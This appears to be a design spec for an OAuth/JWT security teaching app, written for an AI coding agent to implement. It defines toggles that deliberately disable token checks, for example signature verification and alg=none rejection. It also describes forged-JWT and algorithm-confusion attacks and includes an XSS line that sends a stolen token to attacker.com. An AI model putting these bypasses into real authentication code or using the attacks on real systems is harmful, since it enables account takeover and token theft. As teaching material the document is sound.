# Vulnerability Mode Reference - Token Security
## Token Endpoint, Validation, Storage, and Transmission Vulnerabilities

> *"Tokens are like keys to your house. Would you leave them unencrypted on the front porch?"*

---

## Document Information

| Property | Value |
|----------|-------|
| **Document Type** | Detailed Vulnerability Specifications |
| **Categories** | Token Endpoint, Validation, Storage, Transmission, Refresh Tokens, Flows |
| **Toggles Covered** | 25+ token-related vulnerabilities |
| **Target** | Claude Code (implementation) |
| **Part** | 3 of 4 |

---

## Token Endpoint Vulnerabilities

### Toggle: SKIP_CLIENT_AUTH

**Full Name**: Skip Client Authentication

**Category**: Token Endpoint

**Attack**: Client Impersonation

**Severity**: üî¥ Critical

**Spec**: RFC 6749 ¬ß3.2.1, Security BCP ¬ß4.14

**What It Does**: Token endpoint does not authenticate the client, allowing any client to impersonate confidential clients.

**Attack Scenario**:
1. Attacker discovers confidential client_id
2. Attacker makes token request without client_secret
3. Server accepts request (no authentication required)
4. Attacker obtains tokens as if they were the legitimate client

**Mitigation**: Always authenticate confidential clients via client_secret, JWT, or mTLS

**Code**:
```javascript
if (!vulnerabilities.SKIP_CLIENT_AUTH && client.type === 'confidential') {
  // Verify client credentials
  if (!verifyClientCredentials(clientId, clientSecret)) {
    throw new Error('Client authentication failed');
  }
}
```

---

### Toggle: WEAK_CLIENT_SECRET

**Full Name**: Use Weak Client Secret

**Category**: Token Endpoint

**Attack**: Secret Compromise

**Severity**: üü† High

**What It Does**: Uses weak, easily guessable client secrets (short length, dictionary words, sequential).

**Attack Scenario**:
1. Attacker discovers weak secret through brute force or dictionary attack
2. Attacker authenticates as legitimate client
3. Attacker exchanges stolen authorization codes
4. Attacker accesses protected resources

**Mitigation**: Use 32+ character random secrets, rotateregularly

---

## Token Validation Vulnerabilities

### Toggle: SKIP_JWT_VERIFICATION

**Full Name**: Skip JWT Signature Verification

**Category**: Token Validation

**Attack**: Token Forgery

**Severity**: üî¥ Critical

**Spec**: RFC 7515, RFC 7519

**Related Docs**: `jwt-structure-and-validation.md`

**What It Does**: Accepts JWTs without verifying cryptographic signature.

**Attack Scenario**:
```
1. Attacker obtains any valid JWT
2. Attacker modifies claims (change sub, add roles)
3. Attacker presents forged JWT to resource server
4. If verification skipped: Forged JWT accepted
5. Attacker gains unauthorized access with fake identity
```

**Demonstration**:
1. Enable toggle
2. Obtain valid JWT
3. Modify claims in tool
4. Submit to resource server
5. Show acceptance despite invalid signature
6. Compare with verification enabled (rejection)

**Impact**: Complete authentication bypass

**Mitigation**:
```javascript
async function validateJWT(token, jwks) {
  if (vulnerabilities.SKIP_JWT_VERIFICATION) {
    console.warn('üö® CRITICAL: JWT verification disabled!');
    return decodeJWT(token); // DANGEROUS
  }
  
  // Proper verification
  const { header, payload, signature } = decodeJWT(token);
  const publicKey = findKey(jwks, header.kid);
  const valid = await verifySignature(token, publicKey, header.alg);
  
  if (!valid) {
    throw new Error('Invalid JWT signature');
  }
  
  return payload;
}
```

---

### Toggle: ACCEPT_NONE_ALGORITHM

**Full Name**: Accept alg=none JWT Algorithm

**Category**: Token Validation

**Attack**: Critical Signature Bypass

**Severity**: üî¥ Critical

**Spec**: RFC 7515 ¬ß8.1

**Related Docs**: `jwt-structure-and-validation.md` ¬ß10

**What It Does**: JWT library accepts `"alg": "none"` (unsigned JWTs).

**Attack Scenario**:
```
Original JWT Header:
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-123"
}

Attacker Modifies:
{
  "alg": "none",    ‚Üê Changed
  "typ": "JWT"
}

Attacker Modifies Payload:
{
  "sub": "admin",   ‚Üê Changed from "user"
  "role": "admin",  ‚Üê Added
  "exp": 9999999999
}

Attacker Removes Signature:
header.payload.     ‚Üê No signature

If validator accepts alg=none:
‚úì Token accepted despite no signature
‚úì Attacker is now "admin"
```

**Educational Value**:
- One of most critical JWT vulnerabilities
- Why explicit algorithm validation required
- Historical CVE-2015-9235 and similar

**Impact**: Complete authentication bypass, privilege escalation

**Mitigation**:
```javascript
function validateJWT(token) {
  const { header } = decodeJWT(token);
  
  // CRITICAL: Explicitly reject alg=none
  if (header.alg === 'none' || header.alg === 'None' || header.alg === 'NONE') {
    throw new Error('alg=none not allowed');
  }
  
  if (vulnerabilities.ACCEPT_NONE_ALGORITHM) {
    console.warn('üö® CRITICAL: Accepting unsigned JWTs!');
    return decodeJWT(token).payload; // DANGEROUS
  }
  
  // Verify signature...
}
```

---

### Toggle: FLEXIBLE_JWT_ALGORITHM

**Full Name**: Flexible JWT Algorithm Acceptance

**Category**: Token Validation

**Attack**: Algorithm Confusion

**Severity**: üî¥ Critical

**Spec**: RFC 7515 ¬ß8.2

**What It Does**: Accepts any algorithm in JWT header instead of requiring specific algorithm.

**Attack Scenario (RS256 to HS256 Confusion)**:
```
Server uses RS256 (asymmetric):
- Signs with RSA private key
- Validates with RSA public key

Attacker discovers public key (public by definition)

Attacker creates JWT:
{
  "alg": "HS256",    ‚Üê Changed to symmetric
  "typ": "JWT"
}
{
  "sub": "attacker",
  "role": "admin"
}

Attacker signs with HMAC-SHA256 using public key as secret:
signature = HMAC-SHA256(header + payload, publicKey)

If validator uses header.alg flexibly:
- Sees "HS256"
- Uses public key as HMAC secret (thinking it's validating HS256)
- Signature matches (attacker created signature with same key)
- Forged JWT accepted
```

**Mitigation**:
```javascript
const EXPECTED_ALGORITHM = 'RS256'; // Define expected algorithm

function validateJWT(token, publicKey) {
  const { header } = decodeJWT(token);
  
  if (!vulnerabilities.FLEXIBLE_JWT_ALGORITHM) {
    // Enforce expected algorithm
    if (header.alg !== EXPECTED_ALGORITHM) {
      throw new Error(`Invalid algorithm: expected ${EXPECTED_ALGORITHM}, got ${header.alg}`);
    }
  }
  
  // Verify with enforced algorithm
  return verifySignature(token, publicKey, EXPECTED_ALGORITHM);
}
```

---

### Toggle: SKIP_EXPIRATION_CHECK

**Full Name**: Skip Token Expiration Validation

**Category**: Token Validation

**Severity**: üü† High

**Spec**: RFC 7519 ¬ß4.1.4

**What It Does**: Accepts expired JWTs (ignores `exp` claim).

**Attack**: Use stolen tokens indefinitely

**Mitigation**:
```javascript
function validateExpiration(payload) {
  if (vulnerabilities.SKIP_EXPIRATION_CHECK) {
    console.warn('‚ö†Ô∏è Expiration check disabled');
    return;
  }
  
  const now = Math.floor(Date.now() / 1000);
  if (payload.exp && payload.exp < now) {
    throw new Error('Token expired');
  }
}
```

---

### Toggle: SKIP_AUD_CHECK

**Full Name**: Skip Audience Validation

**Category**: Token Validation

**Severity**: üü† High

**Spec**: RFC 7519 ¬ß4.1.3, OIDC Core

**What It Does**: Does not validate `aud` (audience) claim.

**Attack**: Token intended for Service A used at Service B

**Mitigation**: Always validate audience matches expected value

---

### Toggle: SKIP_ISS_CHECK

**Full Name**: Skip Issuer Validation

**Category**: Token Validation

**Severity**: üî¥ Critical

**Spec**: RFC 7519 ¬ß4.1.1

**What It Does**: Does not validate `iss` (issuer) claim.

**Attack**: Token from untrusted issuer accepted

---

### Toggle: SKIP_NONCE

**Full Name**: Skip Nonce Validation (OIDC)

**Category**: Token Validation

**Severity**: üü† High

**Spec**: OIDC Core ¬ß3.1.3.7

**What It Does**: Does not validate `nonce` claim in ID token.

**Attack**: ID token replay attack

**Scenario**:
1. Attacker intercepts ID token
2. Attacker replays ID token in their own session
3. Without nonce validation: Replay succeeds

---

### Toggle: SKIP_AT_HASH

**Full Name**: Skip Access Token Hash Validation

**Category**: Token Validation

**Severity**: üü† High

**Spec**: OIDC Core ¬ß3.1.3.7

**Related Docs**: `id-tokens-oidc.md`

**What It Does**: Does not validate `at_hash` claim in ID token.

**Attack**: Access token injection (substitute different access token)

---

## Token Storage Vulnerabilities

### Toggle: LOCALSTORAGE_TOKENS

**Full Name**: Store Tokens in localStorage

**Category**: Token Storage

**Attack**: XSS Token Theft

**Severity**: üî¥ Critical

**Spec**: Security BCP ¬ß4.3.3

**What It Does**: Stores access tokens and refresh tokens in browser localStorage.

**Attack Scenario**:
```
1. Application stores tokens in localStorage:
   localStorage.setItem('access_token', token);

2. Attacker injects malicious script (XSS):
   <script>
   const token = localStorage.getItem('access_token');
   fetch('https://attacker.com/steal?token=' + token);
   </script>

3. Any XSS vulnerability = Token theft
4. Attacker uses stolen tokens
```

**Why Critical**:
- localStorage accessible to all JavaScript
- Survives page reloads (persistence increases risk)
- No HttpOnly protection
- Common misconfiguration

**Mitigation**:
- Store tokens in memory only
- Use HttpOnly cookies for refresh tokens
- Never use localStorage for sensitive tokens

**Code**:
```javascript
// WRONG
if (vulnerabilities.LOCALSTORAGE_TOKENS) {
  localStorage.setItem('access_token', accessToken); // ‚ùå
  localStorage.setItem('refresh_token', refreshToken); // ‚ùå CRITICAL
}

// CORRECT
// In-memory storage only
let accessToken = null;
let refreshToken = null; // Or secure HttpOnly cookie
```

---

## Token Transmission Vulnerabilities

### Toggle: ALLOW_TOKEN_IN_URL

**Full Name**: Allow Tokens in URL

**Category**: Token Transmission

**Attack**: Token Leakage via URL

**Severity**: üî¥ Critical

**Spec**: Security BCP ¬ß4.2.4

**What It Does**: Passes access tokens in URL query parameters or fragments.

**Attack Scenario**:
```
1. Application constructs API request:
   https://api.example.com/data?access_token=SECRET_TOKEN

2. Token exposed in multiple ways:
   - Browser history
   - Server logs
   - Proxy logs
   - Referer headers
   - Browser bookmarks

3. Token stolen from logs or history
```

**Mitigation**: Always use Authorization header

```javascript
// WRONG
if (vulnerabilities.ALLOW_TOKEN_IN_URL) {
  url = `${apiUrl}?access_token=${token}`; // ‚ùå
}

// CORRECT
fetch(apiUrl, {
  headers: {
    'Authorization': `Bearer ${token}` // ‚úì
  }
});
```

---

### Toggle: HTTP_RESOURCE_SERVER

**Full Name**: Allow HTTP Resource Server

**Category**: Token Transmission

**Attack**: Network-Level Token Interception

**Severity**: üî¥ Critical

**What It Does**: Allows tokens to be sent to HTTP (not HTTPS) resource servers.

**Attack**: MITM captures Bearer tokens in plaintext

---

### Toggle: ALLOW_FRAGMENT_TOKENS

**Full Name**: Allow Tokens in URL Fragment

**Category**: Token Transmission

**Attack**: History/Referer Token Leakage

**Severity**: üü† High

**Spec**: Security BCP ¬ß2.1.2

**What It Does**: Uses implicit flow or otherwise places tokens in URL fragment.

**Related**: Implicit flow deprecated for this reason

---

## Refresh Token Vulnerabilities

### Toggle: REUSABLE_REFRESH_TOKENS

**Full Name**: Allow Refresh Token Reuse

**Category**: Refresh Token

**Attack**: Refresh Token Replay

**Severity**: üü† High

**Spec**: Security BCP ¬ß4.13.2

**Related Docs**: `refresh-tokens.md`

**What It Does**: Refresh tokens can be used multiple times instead of single-use.

**Attack Scenario**:
```
1. Attacker steals refresh token
2. Victim uses refresh token (gets new access token)
3. Attacker ALSO uses same refresh token
4. If reusable: Attacker also gets access token
5. Both victim and attacker have valid tokens
```

**Mitigation**: Refresh token rotation
```javascript
// Token endpoint response
{
  "access_token": "new_access_token",
  "refresh_token": "new_refresh_token", // Different from old
  "token_type": "Bearer"
}
// Old refresh token is now invalid
```

---

## Flow-Specific Vulnerabilities

### Toggle: IMPLICIT_FLOW

**Full Name**: Enable Implicit Flow

**Category**: Flow-Specific

**Attack**: Multiple (see Implicit Flow Spec)

**Severity**: üî¥ Critical

**Spec**: Security BCP ¬ß2.1.2

**Related Docs**: `deprecated-implicit-flow.md`

**What It Does**: Enables deprecated implicit flow.

**Why Deprecated**:
1. Tokens in URL fragment
2. No client authentication
3. No refresh tokens
4. Token leakage multiple vectors
5. Cannot use PKCE

**Demonstration**: Compare implicit vs authorization code + PKCE

---

### Toggle: PASSWORD_GRANT

**Full Name**: Enable Resource Owner Password Credentials

**Category**: Flow-Specific

**Attack**: Credential Exposure

**Severity**: üî¥ Critical

**Spec**: Security BCP ¬ß2.4

**Related Docs**: `deprecated-resource-owner-password-flow.md`

**What It Does**: Enables password grant (user credentials to client).

**Why Deprecated**:
- User credentials exposed to client
- Defeats OAuth's purpose
- Phishing risk
- No MFA support

---

### Toggle: LOG_CREDENTIALS

**Full Name**: Log User Credentials

**Category**: Flow-Specific

**Attack**: Credential Logging

**Severity**: üî¥ Critical

**What It Does**: Logs username/password when using password grant.

**Attack**: Credentials in log files, accessible to attackers

---

## Implementation Guide Summary

### Integration Points

Each vulnerability toggle affects specific code paths:

```javascript
class OAuth2Client {
  constructor(config, vulnerabilities = {}) {
    this.config = config;
    this.vuln = vulnerabilities;
  }
  
  // Authorization endpoint
  async authorize() {
    if (!this.vuln.DISABLE_PKCE) { /* PKCE */ }
    if (!this.vuln.SKIP_STATE_VALIDATION) { /* State */ }
    if (!this.vuln.LAX_REDIRECT_URI) { /* Exact URI */ }
  }
  
  // Token endpoint
  async exchangeCode(code) {
    if (!this.vuln.SKIP_CLIENT_AUTH) { /* Auth client */ }
    if (!this.vuln.DISABLE_PKCE) { /* Send verifier */ }
  }
  
  // Token validation
  async validateToken(token) {
    if (!this.vuln.SKIP_JWT_VERIFICATION) { /* Verify sig */ }
    if (!this.vuln.ACCEPT_NONE_ALGORITHM) { /* Check alg */ }
    if (!this.vuln.SKIP_EXPIRATION_CHECK) { /* Check exp */ }
    if (!this.vuln.SKIP_AUD_CHECK) { /* Check aud */ }
  }
  
  // Token storage
  storeTokens(tokens) {
    if (this.vuln.LOCALSTORAGE_TOKENS) {
      localStorage.setItem('tokens', JSON.stringify(tokens)); // DANGEROUS
    } else {
      this.tokens = tokens; // In-memory
    }
  }
}
```

---

## Document Metadata

| Property | Value |
|----------|-------|
| **Version** | 1.0.0 |
| **Part** | 3 of 4 (Token Security) |
| **Toggles Covered** | 25+ token vulnerabilities |
| **Target** | Claude Code (implementation) |

---

**Next**: See `vulnerability-mode-implementation.md` for complete implementation guide, testing, and educational content requirements.
